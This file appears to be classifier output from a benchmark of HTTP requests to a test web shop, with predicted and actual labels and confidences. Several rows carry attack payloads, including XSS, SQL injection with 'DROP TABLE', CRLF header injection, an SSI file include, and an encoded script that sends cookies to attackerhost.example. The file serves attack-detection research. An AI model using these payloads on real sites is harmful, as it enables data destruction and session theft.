Predicted,Actual,Confidence,Method,Content,URL
1,Anomalous,99.14%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0,Normal,98.67%,GET,,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
0,Normal,67.82%,POST,modo=registro&login=xingdong&password=adepTo&nombre=Eli&apellidos=Pellicer&email=flori%40casabolsa43.np&dni=03557191B&direccion=La+Fragua+158%2C+11-E&ciudad=Montferri&cp=45250&provincia=Vizcaya&ntc=6262014386687000&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,74.59%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=eddisfor4&password=deSelecTRizacI%F3.n&nombre=Leroy&apellidos=Ellston+Balladares&email=valadao%40salaparis.ls&dni=03344221K&direccion=C%2F+Cala+Bona%2C+80%2C+&ciudad=San+Fernando+de+Henares&cp=22880&provincia=Tarragona&ntc=1764760587372326&B1=Registrar HTTP/1.1
0,Normal,89.78%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=31&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,98.86%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
1,Anomalous,82.85%,POST,modo=registro&login=brunner-&password=chacr4&nombre=Rosio&apellidos=Sklar+Paisano&email=ekblad.pughe%40sindns.lb&dni=65648262Y&direccion=Calle+Codigo+Correspondencia+Oficial+Correos-telegrafos+14+&ciudad=Aloc%E9n&cp=39490&provincia=Huesca&ntc=2810115740271505&B1=%2520,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,85.90%,POST,modo=registro&login=addons&password=14ab214c6%F3n&nombre=Karla&apellidos=Jauregui+Cortines&email=quartet%40cabare.com.cs&dni=86800649Y&direccion=Paratge+Lila+30%2C+10%3FC&ciudad=Espluga+de+Francol%ED%2C+L%27&cp=06380&provincia=%C1vila&ntc=9091453994786923&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
0,Normal,97.99%,GET,,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
1,Anomalous,99.15%,POST,modo=registro&login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=47182191Z&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cp=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
1,Anomalous,78.65%,GET,,http://localhost:8080/tienda1/6909030637832563290.jsp HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1,Anomalous,93.40%,POST,modo=registro&login=damiano&password=EsCoGiDAMeNte&nombre=Vilmar&apellidos=Mateu+Bernaus&email=sheybal%40cirugiaparpado.no&dni=75586196P&direccion=Travesia+Nardo+124%2C+7E&ciudad=Torre+de%2F+Mi*guel+Sesmer%2Bo&cp=42311&provincia=C%E1ceres&ntc=6955835443751937&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
1,Anomalous,99.03%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/asf-logo-wide HTTP/1.1
0,Anomalous,87.76%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=avictor&password=e5TRELl5&nombre=Sebasti%E1n&apellidos=Shley+Rota&email=biliotti%40juegois.aw&dni=43126997L&direccion=Calle+Melilla%2C+158%2C+&ciudad=Fresno+de+Caracena&cp=08650&provincia=Tarrag%3Fona&ntc=1214776714358513&B1=Registrar HTTP/1.1
0,Normal,75.90%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=malcolm&password=7ra0sp64t9r&nombre=Alexiana&apellidos=Boixad%E9+Delacerda&email=colvin%40freemachine.no&dni=21096784B&direccion=C%2F+Torre%2C+23+&ciudad=Puebla+de+Bele%F1a&cp=17154&provincia=Palencia&ntc=9557381014556334&B1=Registrar HTTP/1.1
1,Anomalous,97.65%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=don&pwd=co4trO5ersa&remember=off&B1=Entrar HTTP/1.1
0,Normal,98.67%,GET,,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
1,Anomalous,99.24%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
0,Anomalous,73.14%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=j%2Calaie&password=al9mb%2B532&nombre=Onila&apellidos=Furcat+Zarco&email=greiff%40opticaweb.bu&dni=36455660Q&direccion=Calle+Nueve+57+&ciudad=Utiel&cp=01899&provincia=Madrid&ntc=0088492463086794&B1=Registrar HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
0,Normal,97.57%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2331&B1=Pasar+por+caja HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
0,Normal,98.66%,GET,,http://localhost:8080/tienda1/index.jsp HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
1,Anomalous,86.04%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sarene&pwd=pROHIJamIenTo&rememberA=off&B1=Entrar HTTP/1.1
1,Anomalous,99.24%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1
1,Normal,64.47%,POST,modo=registro&login=harty&password=torn%E9s&nombre=Doreteo&apellidos=Llobet&email=brace4%40velazquezlarra%F1aga.kz&dni=19783837L&direccion=Alcalde+Lopez+Ranca%F1o%2C+194%2C+3-E&ciudad=Vilafam%E9s&cp=09270&provincia=Valladolid&ntc=1499600534131254&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1,Anomalous,99.99%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F HTTP/1.1
0,Normal,98.40%,POST,id=1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1,Anomalous,99.09%,POST,modo=registro&login=poliwoda&password=enigmatista&nombre=Tarciano&apellidos=Cam%ED+Tordera&email=nardo%40codwatw.lk&dni=08762650H&direccion=Federico+Landrove+Moi%F1o+105+3-G&ciudad=Goizueta&cp=19360&provincia=Alicanteparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&ntc=7171983347621063&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,98.86%,POST,B2A=Vaciar+carrito,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1,Anomalous,89.96%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=buffett&password=vejete&nombre=Zoeli&apellidos=Navas+Gorriz&email=lowler-hoi-shan6%40webgune.bj&dni=90025435P&direccion=Cabrera%2C+153+7%3FA&ciudad=Santa+Mar%EDa+de+Ord%E1s&cp=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&provincia=Lleida&ntc=9769918811334498&B1=Registrar HTTP/1.1
0,Normal,98.96%,POST,errorMsg=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1,Anomalous,61.73%,POST,modo=registro&login=terryl&password=des9erco&nombre=Haroid&apellidos=Dawaher&email=%27INJECTED_PARAM&dni=14559882P&direccion=C%2F+Doctor+Francisco+Saiz+Sanz%2C+159%2C+&ciudad=Alberca%2C+La&cp=03770&provincia=Salamanca&ntc=3772824400880183&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/samples/isapi/isapi.htm HTTP/1.1
0,Normal,98.83%,GET,,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0,Normal,89.65%,POST,modo=entrar&login=putman&pwd=cuz&remember=on&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1,Anomalous,97.87%,POST,modo=insertar&precioA=1633&B1=Confirmar,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1,Anomalous,76.39%,POST,modo=registro&login=siomalas&password=di%E1grafo&nombre=%2B&apellidos=Charles+Sanpedro&email=cavanaugh%40indianabilljaen.mt&dni=29523560R&direccion=Manuel+De+Castro%2C+176%2C+7-D&ciudad=San+Agust%EDn+del+Guadalix&cp=45917&provincia=Guip%FAzcoa&ntc=4540479003454435&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,98.33%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8122&B1A=Confirmar HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0,Normal,98.81%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
1,Anomalous,98.86%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
1,Anomalous,97.93%,POST,id=1&nombre=Queso+Manchego&precio=85%2F&cantidad=5&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
0,Normal,89.78%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=57&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1,Anomalous,98.86%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
0,Normal,94.88%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=11&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
1,Anomalous,62.99%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=welham&password=cet%E1rea&nombre=Tarsilia&apellidos=Serradell&email=sara.bagashvili%40sunglasses.nom.gr&dni=27733046Z&direccion=Cerro+Ramaderia+S%2FN+8%3FC&ciudad=%27INJECTED_PARAM&cp=02360&provincia=Lugo&ntc=3481071462529390&B1=Registrar HTTP/1.1
0,Normal,84.91%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=joudrey&password=barcote&nombre=Clovis&apellidos=Vilca+Llora&email=ilijev%40mauroman.tc&dni=64575959D&direccion=El+Provencio%2C+6+8F&ciudad=Montell%E0+i+Martinet&cp=05240&provincia=Cuenca&ntc=7647479172246248&B1=Registrar HTTP/1.1
0,Normal,89.78%,POST,id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=39&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Normal,98.96%,POST,errorMsg=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,99.07%,GET,,http://localhost:8080/admin/logon.jsp HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
0,Normal,98.83%,GET,,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
0,Normal,83.57%,POST,modo=registro&login=hadel&password=hatajo&nombre=Yasna&apellidos=Brivio&email=hymen_israeli%40aulahost.vc&dni=75010741J&direccion=Cami+Llorito%2C+38+&ciudad=A%EDnsa-Sobrarbe&cp=43713&provincia=%C1lava&ntc=5968115219030593&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.96%,GET,,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/4861362529278789730.Bak HTTP/1.1
0,Normal,94.88%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=73&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,98.58%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6741&B1=Confirmar HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1,Anomalous,93.81%,POST,modo=registro&login=cleve&password=Gl%CDp3iCa&nombre=Ninfa&apellidos=Perarnau+Casas&email=gwinn%40laspruebascongaseosa.cz%22+AND+%221%22%3D%221&dni=36470806M&direccion=Pla%E7a+Dels+Carros+83%2C+&ciudad=Darnius&cp=31218&provincia=Navarra&ntc=8300950645319009&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1,Anomalous,86.08%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ozzy&pwdA=respuesto&remember=on&B1=Entrar HTTP/1.1
0,Normal,98.81%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1,Anomalous,99.03%,GET,,http://localhost:8080/tienda1/imagenes/2.gif/4861362529278789730.Inc HTTP/1.1
0,Normal,68.80%,POST,modo=registro&login=yoon-mo&password=MalCaso&nombre=Shanir&apellidos=Baye&email=sire%40gay-tantra.ck&dni=56597686E&direccion=C%2F+Muntaner%2C+21+&ciudad=Pinar%2C+El&cp=28737&provincia=%C1vila&ntc=9280522239849881&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
1,Anomalous,98.79%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7525&B1=Pasar+por+caja%2F HTTP/1.1
0,Normal,98.96%,POST,errorMsg=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,98.46%,GET,,http://localhost:8080/tienda1/publico/productos.jsp/6909030637832563290.jsp HTTP/1.1
0,Normal,97.99%,GET,,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
0,Normal,98.83%,GET,,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
1,Anomalous,98.34%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=berenice&pwd=ENfEUdACI%F3n&remember=off%2F&B1=Entrar HTTP/1.1
0,Normal,98.40%,POST,id=2,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
1,Anomalous,98.83%,GET,,http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.Inc HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
1,Anomalous,98.44%,GET,,http://localhost:8080/tienda1/asf-logo-wide.gif HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0,Normal,98.83%,GET,,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
1,Anomalous,99.25%,POST,id=1%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,98.40%,POST,id=1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1,Anomalous,99.80%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Riojaany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&precio=39&cantidad=73&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,88.80%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=o.donnel&password=menospreciativo&nombre=Elian&apellidos=Claret+Pedrola&email=ritz%40hipergipuzkoa.pa&dni=57401003H&direccion=Regimiento%2C+114%2C+&ciudad=Hortezuela+de+Oc%E9n&cp=46084&provincia=Lleida&ntc=2618804730024814&B1=Registrar HTTP/1.1
1,Anomalous,86.96%,POST,id=1&nombre=Queso+Manchego&precio=100&cantidadA=48&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
0,Normal,99.23%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
0,Normal,98.81%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
1,Anomalous,98.49%,POST,modo=registro&login=fayette&password=erECta&nombre=Katerina&apellidos=Moyano+Hasb%FAn&email=rosley-flakenstein%40alquivira.af&dni=91432847G&direccion=Napols+128%2C+4C&ciudad=Quintana+de+la+Serena&cp=18360&provincia=Ourense&ntc=6775628411457968paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
0,Normal,88.79%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lebars&password=C9r6n0233escA&nombre=Tarsila&apellidos=L%FCttecke&email=uytterlinden%40lamolahotel.ro&dni=36824115B&direccion=Errekerte+113%2C+&ciudad=Guils+de+Cerdanya&cp=23485&provincia=Almer%EDa&ntc=7791374198907519&B1=Registrar HTTP/1.1
1,Anomalous,97.70%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=6606&B1=Pasar+por+caja HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,97.99%,GET,,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
1,Anomalous,99.27%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
1,Anomalous,97.19%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=akhtar6&pwd=56s5r6sa&remember=offSet-cookie%253A%2BTamper%253D1041264011025374727&B1=Entrar HTTP/1.1
1,Anomalous,98.96%,GET,,http://localhost:8080/tienda1/publico/6909030637832563290.jsp.INC HTTP/1.1
1,Anomalous,97.55%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=vivier&pwd=59ni87&remember=off&B1=Entrar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E HTTP/1.1
1,Anomalous,99.00%,GET,,http://localhost:8080/tienda1/publico/productos.jsp/6909030637832563290.jsp.INC HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1,Anomalous,99.27%,PUT,modo=registro&login=mamie&password=mOnJA&nombre=Ecio&apellidos=Mendivil+Bellv%E9&email=wei%40alfombra.com.gw&dni=33914626E&direccion=Calle+Galera+7%2C+&ciudad=Cordobilla+de+L%E1cara&cp=03720&provincia=Santa+Cruz+de+Tenerife&ntc=6649652935543559&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,80.88%,POST,modo=registro&login=baheya&password=pOlvo&nombre=Shannen&apellidos=Fonterosa+V%E9jar&email=mccollon%40irmedia.ca&dni=14399392N&direccion=Calle+Arriola+29%2C+&ciudad=Armenteros&cp=08580&provincia=Guadalajara&ntc=5706258775201783&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,52.99%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dao&password=enamorar&nombre=Pancracia&apellidos=Azagra&email=mccauley%40autobuses-hibridos.ph&dni=62120654T&direccion=Paseo+Rey%2C+167+8-F&ciudad=Ausines%2C+Los&cp=20530&provincia=Teruel&ntc=1218546824754723&B1=Registrar HTTP/1.1
0,Normal,98.81%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1,Anomalous,89.71%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=%27INJECTED_PARAM&login=gordy&password=malcomida&nombre=Cebele&apellidos=Palah%ED+Cabezas&email=capoliccio%40almeriastella.jo&dni=94088087D&direccion=C%2F+Dels+Escales+Del+Miracle%2C+37%2C+7-F&ciudad=Arbanc%F3n&cp=31229&provincia=Cantabria&ntc=7224824987028849&B1=Registrar HTTP/1.1
0,Normal,89.65%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=masahiro&pwd=comba&remember=off&B1=Entrar HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
1,Anomalous,56.10%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kaleena2&password=InMEMO2ial&nombre=Nazareth&apellidos=Daniel+Barquin&email=ferco-stanczak%40%40noviast%40eresapa%40lacios.kw&dni=08092387K&direccion=Glorieta+Arabial+S%2FN%2C+10%3FD&ciudad=Pedrera&cp=40314&provincia=Soria&ntc=9093119555934526&B1=Registrar HTTP/1.1
0,Normal,98.96%,POST,errorMsg=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
1,Anomalous,94.71%,POST,modo=insertar&precio=6840any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Confirmar,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1,Anomalous,99.27%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
0,Normal,89.65%,POST,modo=entrar&login=piette&pwd=eSCartivana&remember=on&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1,Anomalous,99.24%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
0,Normal,97.99%,GET,,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
0,Normal,99.23%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
0,Normal,94.88%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=32&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,98.96%,POST,errorMsg=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,98.83%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp/asf-logo-wide.gif/ HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1,Anomalous,86.96%,POST,id=1&nombre=Vino+Rioja&precio=100&cantidadA=53&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
